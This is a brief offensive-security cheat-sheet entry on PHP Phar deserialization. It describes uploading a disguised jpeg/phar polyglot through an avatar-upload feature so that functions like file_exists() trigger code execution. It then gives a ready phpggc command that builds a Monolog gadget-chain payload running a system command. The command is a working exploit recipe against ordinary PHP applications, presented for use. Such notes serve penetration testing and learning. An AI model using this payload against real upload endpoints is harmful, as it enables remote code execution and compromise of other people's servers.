Phar Deserialization:
If there's an upload functionality f.ex upload your avatar image you could then upload a jpeg/phar file to get code execution if the code utilizes the right function. Ex the file_exists() function.

Make payload with
<https://github.com/ambionics/phpggc>
./phpggc -pj /tmp/dummy.jpg -o /tmp/z.zip.phar monolog/rce1 system id

